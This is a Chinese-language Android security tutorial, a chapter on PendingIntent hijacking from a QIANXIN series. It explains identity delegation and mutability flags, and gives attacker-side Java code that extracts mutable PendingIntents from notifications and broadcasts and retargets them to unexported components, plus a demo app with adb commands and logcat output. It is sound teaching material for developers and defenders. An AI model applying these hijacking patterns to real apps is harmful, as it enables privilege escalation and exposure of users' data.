# Android移动安全第九章_PendingIntent安全
> QIANXIN Team
> 来源：https://forum.butian.net/share/4876

> 系列目录：
> 
> 1.  Android 组件导出安全
> 2.  Android Intent 安全
> 3.  Android Binder 服务安全
> 4.  Android ContentProvider 安全
> 5.  Android WebView 安全
> 6.  Android UI 欺骗与钓鱼
> 7.  Android Deep Link 安全
> 8.  Android 广播安全
> 9.  Android PendingIntent 安全（本章）
> 10.  Android 系统设置安全
> 11.  Android SSRF 与网络安全
> 12.  Android 加密与数据存储安全
> 13.  Android 认证与证书校验
> 14.  Android Zip Slip 路径遍历
> 15.  Android Fragment Injection
> 16.  Android SELinux 与沙箱机制

* * *

## 1\. 前言

前面几章讲的 Intent、广播、组件导出，都是"直接调用"——调用方自己发出 Intent，系统根据调用方的身份和权限决定是否放行。PendingIntent 不一样，它是"间接调用"。

PendingIntent 的工作方式是：App A 创建一个 PendingIntent，把它交给 App B（或系统）。当 B 在未来某个时刻触发这个 PendingIntent 时，系统以 A 的身份和权限来执行其中的 Intent，而不是以 B 的身份。

这个机制在 Android 中使用非常广泛：

-   通知（Notification）：App 创建通知时，把点击后要执行的操作包装成 PendingIntent 交给系统通知服务。用户点击通知时，系统代替 App 执行这个操作
-   闹钟（AlarmManager）：App 设置定时任务时，把到时间后要执行的操作包装成 PendingIntent 交给 AlarmManager
-   桌面小部件（AppWidget）：小部件的点击事件通过 PendingIntent 传递给 App 处理

问题在于：如果 App A 创建的 PendingIntent 中的 Intent 是"空的"或"不完整的"，拿到这个 PendingIntent 的 App B 可以往里面填充内容，然后触发执行——执行时用的是 A 的身份和权限。这就是 PendingIntent 劫持的基本原理。

* * *

## 2\. PendingIntent 基础

### 2.1 创建方式

PendingIntent 有三种创建方式，分别对应三种组件操作：

```java

PendingIntent pi = PendingIntent.getActivity(context, requestCode, intent, flags);


PendingIntent pi = PendingIntent.getService(context, requestCode, intent, flags);


PendingIntent pi = PendingIntent.getBroadcast(context, requestCode, intent, flags);
```

参数说明：

-   context：创建者的上下文，决定了 PendingIntent 执行时使用谁的身份
-   requestCode：请求码，用于区分同一个 App 创建的不同 PendingIntent
-   intent：要执行的 Intent
-   flags：控制 PendingIntent 行为的标志位

### 2.2 Flags

flags 参数对安全性影响很大：

| Flag | 含义 |
| --- | --- |
| FLAG_IMMUTABLE | PendingIntent 创建后不可修改（Android 12+ 默认要求） |
| FLAG_MUTABLE | PendingIntent 创建后可以被修改 |
| FLAG_UPDATE_CURRENT | 如果已存在相同的 PendingIntent，更新其中的 Intent extras |
| FLAG_CANCEL_CURRENT | 如果已存在相同的 PendingIntent，取消旧的，创建新的 |
| FLAG_ONE_SHOT | PendingIntent 只能被使用一次 |

FLAG\_MUTABLE 和 FLAG\_IMMUTABLE 是安全方面最需要关注的。FLAG\_MUTABLE 意味着拿到 PendingIntent 的一方可以修改其中 Intent 的内容（通过 `send(Context, int, Intent)` 方法传入额外的 Intent 来填充）。

### 2.3 身份委托机制

PendingIntent 的核心特性是身份委托。用一个例子说明：

```java

Intent intent = new Intent(this, InternalActivity.class);
PendingIntent pi = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_MUTABLE);


```

当 App B 调用 `pi.send()` 时，系统以 App A 的身份（UID 1000）执行 Intent。即使 InternalActivity 是 App A 的未导出组件，也能被成功启动——因为执行者的身份是 A 自己。

这就是为什么 PendingIntent 是权限提升的入口：普通 App 拿到系统 App 创建的 PendingIntent 后，可以借用系统 App 的身份执行操作。

* * *

## 3\. PendingIntent 劫持

### 3.1 隐式 Intent 的 PendingIntent

最经典的 PendingIntent 劫持场景是：创建者使用隐式 Intent（不指定目标组件）来构造 PendingIntent。

```java

Intent intent = new Intent("com.example.ACTION_PROCESS");
intent.putExtra("token", "secret_token_123");
PendingIntent pi = PendingIntent.getBroadcast(context, 0, intent,
    PendingIntent.FLAG_MUTABLE);
```

这个 PendingIntent 被触发时，系统会把广播发给所有注册了 `com.example.ACTION_PROCESS` 的 Receiver。攻击者注册一个匹配的 Receiver 就能收到广播，获取其中的 token。

更严重的是，如果 PendingIntent 是 FLAG\_MUTABLE 的，攻击者拿到它之后可以修改 Intent 的目标：

```java

Intent fillIntent = new Intent();
fillIntent.setClassName("com.victim.app", "com.victim.app.InternalActivity");
pendingIntent.send(context, 0, fillIntent);

```

### 3.2 空 Intent 的 PendingIntent

比隐式 Intent 更危险的是空 Intent。有些开发者创建 PendingIntent 时传入一个空的 Intent，打算后续再填充：

```java

PendingIntent pi = PendingIntent.getActivity(context, 0,
    new Intent(), PendingIntent.FLAG_MUTABLE);
```

拿到这个 PendingIntent 的任何一方都可以完全控制 Intent 的内容——action、component、data、extras 全部可以填充。执行时使用的是创建者的身份和权限。

### 3.3 通知中的 PendingIntent 泄露

通知是 PendingIntent 最常见的使用场景，也是泄露的高发区。App 创建通知时，把 PendingIntent 交给系统的 NotificationManager。如果通知可以被其他 App 读取（通过 NotificationListenerService），其中的 PendingIntent 就可能被提取出来。

NotificationListenerService 是 Android 提供的一个系统服务，允许 App 在用户授权后监听所有通知。用户在"设置 → 通知访问权限"中授权后，App 就能读取所有通知的内容，包括其中的 PendingIntent。

```java

public class NotifListener extends NotificationListenerService {
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        Notification notification = sbn.getNotification();
        PendingIntent contentIntent = notification.contentIntent;
        if (contentIntent != null) {
            
            
            try {
                Intent fillIntent = new Intent();
                fillIntent.setClassName("com.victim.app",
                    "com.victim.app.InternalSettingsActivity");
                contentIntent.send(context, 0, fillIntent);
            } catch (PendingIntent.CanceledException e) {
                
            }
        }
    }
}
```

### 3.4 BroadcastReceiver 中的 PendingIntent

有些 App 通过广播传递 PendingIntent，让接收方在处理完某些逻辑后回调。如果广播是隐式的，攻击者可以注册 Receiver 截获广播，拿到其中的 PendingIntent：

```java

Intent callbackIntent = new Intent(this, CallbackReceiver.class);
PendingIntent callback = PendingIntent.getBroadcast(this, 0,
    callbackIntent, PendingIntent.FLAG_MUTABLE);

Intent broadcastIntent = new Intent("com.example.ACTION_REQUEST");
broadcastIntent.putExtra("callback", callback);
sendBroadcast(broadcastIntent);  
```

攻击者收到广播后，提取 PendingIntent 并修改后执行：

```java
public class AttackReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        PendingIntent callback = intent.getParcelableExtra("callback");
        if (callback != null) {
            Intent fill = new Intent();
            fill.setClassName("com.victim.app",
                "com.victim.app.AdminActivity");
            try {
                callback.send(context, 0, fill);
            } catch (PendingIntent.CanceledException e) {}
        }
    }
}
```

* * *

## 4\. FLAG\_MUTABLE 与 FLAG\_IMMUTABLE

### 4.1 可变性的影响

PendingIntent 的可变性（mutability）决定了它被传递给其他方后是否可以被修改。

FLAG\_MUTABLE 的 PendingIntent，接收方可以通过 `send(Context, int, Intent)` 传入一个 fillIntent 来修改原始 Intent 的内容。fillIntent 中设置的字段会覆盖或补充原始 Intent：

```java

Intent intent = new Intent("com.example.ACTION_VIEW");
PendingIntent pi = PendingIntent.getActivity(context, 0, intent,
    PendingIntent.FLAG_MUTABLE);


Intent fillIntent = new Intent();
fillIntent.setComponent(new ComponentName("com.victim.app",
    "com.victim.app.SecretActivity"));
pi.send(context, 0, fillIntent);

```

FLAG\_IMMUTABLE 的 PendingIntent 则不允许修改。接收方调用 `send()` 时传入的 fillIntent 会被忽略（extras 除外——如果原始 Intent 中没有设置某个 extra key，fillIntent 中的对应 key 仍然会被合并进去）。

### 4.2 什么时候需要 FLAG\_MUTABLE

有些场景确实需要 FLAG\_MUTABLE：

-   内联回复通知（Direct Reply）：系统需要把用户输入的文本填充到 PendingIntent 的 extras 中
-   与 `AlarmManager.setExact()` 配合使用时，某些系统版本要求 PendingIntent 可变
-   需要和 `PendingIntent.FLAG_UPDATE_CURRENT` 配合更新 extras

但大多数场景下，FLAG\_IMMUTABLE 就够了。如果不确定，优先使用 FLAG\_IMMUTABLE。

### 4.3 Android 12 的强制要求

Android 12（API 31）开始，创建 PendingIntent 时必须显式指定 FLAG\_MUTABLE 或 FLAG\_IMMUTABLE，否则会抛出异常：

```php
java.lang.IllegalArgumentException: Targeting S+ (version 31 and above)
requires that one of FLAG_IMMUTABLE or FLAG_MUTABLE be specified when
creating a PendingIntent.
```

这个改动强制开发者思考 PendingIntent 是否需要可变。但它不能阻止开发者为了省事直接加 FLAG\_MUTABLE。

* * *

## 5\. 实际攻击场景

### 5.1 LaunchAnywhere

LaunchAnywhere 是 PendingIntent 劫持的一个经典利用模式，最早在 Android 系统的 AccountManagerService 中被发现。

AccountManagerService 在处理添加账户的流程中，会向第三方 Authenticator App 发送一个 PendingIntent（通过 AccountAuthenticatorResponse）。如果 Authenticator 返回的结果中包含一个 KEY\_INTENT，AccountManagerService 会用自己的身份（system\_server，UID 1000）启动这个 Intent。

攻击流程：

1.  恶意 App 注册一个自定义的 AccountAuthenticator
2.  调用 `AccountManager.addAccount()` 触发添加账户流程
3.  系统调用恶意 App 的 Authenticator
4.  Authenticator 在返回结果中放入一个指向系统内部组件的 Intent
5.  AccountManagerService 以 system 身份启动这个 Intent

这个漏洞的本质是：系统服务信任了第三方 App 提供的 Intent，并以自己的高权限身份执行。后续 Android 版本通过检查返回的 Intent 的目标组件是否属于调用者来修复了这个问题。

### 5.2 通知劫持提权

一个更常见的场景：系统 App 创建通知时使用了 FLAG\_MUTABLE 的 PendingIntent，且 Intent 不够具体（没有指定 component）。

```java

Intent intent = new Intent("com.system.ACTION_SETTINGS");
PendingIntent pi = PendingIntent.getActivity(this, 0, intent,
    PendingIntent.FLAG_MUTABLE);

Notification notification = new Notification.Builder(this, channelId)
    .setContentTitle("系统更新")
    .setContentText("点击查看详情")
    .setContentIntent(pi)
    .build();
notificationManager.notify(1, notification);
```

拥有 NotificationListenerService 权限的恶意 App 可以：

1.  监听到这条通知
2.  提取其中的 PendingIntent
3.  用 fillIntent 修改目标为系统内部的敏感 Activity
4.  以系统 App 的身份启动

### 5.3 Widget 点击劫持

桌面小部件（AppWidget）的点击事件通过 PendingIntent 实现。AppWidgetProvider 在 `onUpdate()` 中为小部件的各个 View 设置 PendingIntent：

```java
RemoteViews views = new RemoteViews(context.getPackageName(),
    R.layout.widget_layout);
Intent intent = new Intent(context, WidgetClickHandler.class);
PendingIntent pi = PendingIntent.getBroadcast(context, 0, intent,
    PendingIntent.FLAG_MUTABLE);
views.setOnClickPendingIntent(R.id.widget_button, pi);
```

如果 PendingIntent 是 FLAG\_MUTABLE 的，且 Intent 不够具体，Launcher App（桌面启动器）理论上可以修改 PendingIntent 的内容。虽然主流 Launcher 不会这么做，但自定义 Launcher 或恶意 Launcher 可能利用这一点。

* * *

## 6\. 版本演进

### 6.1 Android 6.0（API 23）

引入了 `PendingIntent.getCreatorPackage()` 和 `PendingIntent.getCreatorUid()` 方法，允许接收方查询 PendingIntent 的创建者信息。但这些信息仅供参考，不能作为安全校验的依据——恶意 App 可以创建 PendingIntent 后传递给其他 App，接收方看到的创建者是恶意 App，但执行时用的身份也是恶意 App 的，所以这个信息本身不构成安全问题。

### 6.2 Android 12（API 31）

强制要求指定 FLAG\_MUTABLE 或 FLAG\_IMMUTABLE。这是 PendingIntent 安全方面最重要的一次改动。

同时，Android 12 还限制了 FLAG\_MUTABLE 的 PendingIntent：即使是 mutable 的，fillIntent 也不能覆盖原始 Intent 中已经设置的 component 和 action。只有原始 Intent 中未设置的字段才能被填充。

```java

Intent intent = new Intent();
intent.setComponent(new ComponentName("com.example", "com.example.MyActivity"));
PendingIntent pi = PendingIntent.getActivity(context, 0, intent,
    PendingIntent.FLAG_MUTABLE);


Intent fill = new Intent();
fill.setComponent(new ComponentName("com.victim", "com.victim.Secret"));
pi.send(context, 0, fill);

```

这个限制大幅降低了 FLAG\_MUTABLE PendingIntent 的攻击面，但没有完全消除——extras 仍然可以被填充。

### 6.3 Android 14（API 34）

进一步收紧了 PendingIntent 的安全限制：

-   对后台启动 Activity 的限制更严格，通过 PendingIntent 从后台启动 Activity 需要创建者在创建时显式授权（通过 `ActivityOptions.setPendingIntentBackgroundActivityStartMode()`）
-   对 PendingIntent 的 sender 身份校验更严格

* * *

## 7\. 演示

下面用配套的演示 App（com.demo.pendingintentsecurity）来展示 PendingIntent 劫持的效果。

Demo App 模拟了一个常见场景：App 发送通知时，PendingIntent 指向一个中转 Activity（DispatchActivity），该 Activity 根据 extras 中的 `target_class` 决定跳转目标。原始 Intent 没有设置 `target_class`，正常情况下跳转到默认页面。但因为 PendingIntent 使用了 FLAG\_MUTABLE，攻击者可以通过 fillIntent 注入 `target_class` extra，控制跳转到任意内部组件。

### 7.1 创建不安全的通知

VulnNotificationActivity 创建通知时使用了 FLAG\_MUTABLE 的 PendingIntent：

```java

Intent intent = new Intent(this, DispatchActivity.class);

PendingIntent pi = PendingIntent.getActivity(this, 0, intent,
    PendingIntent.FLAG_MUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);
```

DispatchActivity 根据 extras 决定跳转：

```java
String targetClass = getIntent().getStringExtra("target_class");
if (targetClass != null) {
    Intent intent = new Intent();
    intent.setClassName(getPackageName(), targetClass);
    startActivity(intent);  
} else {
    startActivity(new Intent(this, MainActivity.class));  
}
```

通过 ADB 发送通知：

```bash
adb shell am start -n com.demo.pendingintentsecurity/.VulnNotificationActivity
```

logcat 输出：

```php
W VulnNotification: 通知已发送
W VulnNotification: PendingIntent: 显式 Intent → DispatchActivity, FLAG_MUTABLE
W VulnNotification: 原始 Intent 未设置 target_class，正常跳转到默认页面
W VulnNotification: 但 FLAG_MUTABLE 允许 fillIntent 注入 target_class extra
```

### 7.2 执行劫持

HijackDemoActivity 模拟攻击者的行为——获取到通知中的 mutable PendingIntent 后，通过 fillIntent 注入 `target_class` extra：

```java

Intent originalIntent = new Intent(this, DispatchActivity.class);
PendingIntent pi = PendingIntent.getActivity(this, 0, originalIntent,
    PendingIntent.FLAG_MUTABLE | PendingIntent.FLAG_NO_CREATE);


Intent fillIntent = new Intent();
fillIntent.putExtra("target_class",
    "com.demo.pendingintentsecurity.InternalSecretActivity");
pi.send(context, 0, fillIntent);
```

通过 ADB 触发劫持：

```bash
adb shell am start -n com.demo.pendingintentsecurity/.HijackDemoActivity \
    --ez auto_start true
```

logcat 输出：

```php
W HijackDemo: 成功获取到已有的 mutable PendingIntent
W HijackDemo: 劫持成功：注入 target_class=InternalSecretActivity
W HijackDemo: DispatchActivity 将跳转到未导出的内部组件
W DispatchActivity: 收到 target_class: com.demo.pendingintentsecurity.InternalSecretActivity
W DispatchActivity: 已跳转到: com.demo.pendingintentsecurity.InternalSecretActivity
W InternalSecret: InternalSecretActivity 被通过 PendingIntent 劫持启动
W InternalSecret: 内部机密页面已打开，敏感数据已暴露
```

InternalSecretActivity 是 exported=false 的内部组件，正常情况下外部无法启动。但攻击者通过 fillIntent 向 mutable PendingIntent 注入了 `target_class` extra，DispatchActivity 读取后跳转到了内部机密页面：

![demo9_hijack.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/04/attach-cdd0b84844cb62b039dec338b3e63af734c8d309.png)

如果这个 PendingIntent 使用 FLAG\_IMMUTABLE，fillIntent 中的 extras 不会被合并到原始 Intent 中（原始 Intent 未设置的 key 除外的规则在 Android 12+ 上有变化，但 FLAG\_IMMUTABLE 从根本上阻止了修改），攻击就无法成功。

* * *

## 8\. 总结

PendingIntent 的安全问题围绕"身份委托"展开。创建者把自己的执行权限包装进 PendingIntent 交给其他方，如果 PendingIntent 是可变的且 Intent 不够具体，接收方就能借用创建者的身份执行任意操作。

回顾一下：

-   PendingIntent 以创建者的身份执行，不是触发者的身份
-   FLAG\_MUTABLE 允许接收方修改 Intent 内容，是劫持的前提
-   隐式 Intent 或空 Intent 的 PendingIntent 攻击面最大
-   通知、广播回调、Widget 是 PendingIntent 泄露的常见渠道
-   Android 12 强制要求声明 mutability，并限制了 fillIntent 对已设置字段的覆盖
-   Android 14 进一步限制了通过 PendingIntent 从后台启动 Activity

下一章讲 Android 系统设置安全。Settings.System、Settings.Secure、Settings.Global 这三个命名空间存储了设备的各种配置，部分设置项的读写权限控制不够严格，可能被第三方 App 利用来修改设备行为。
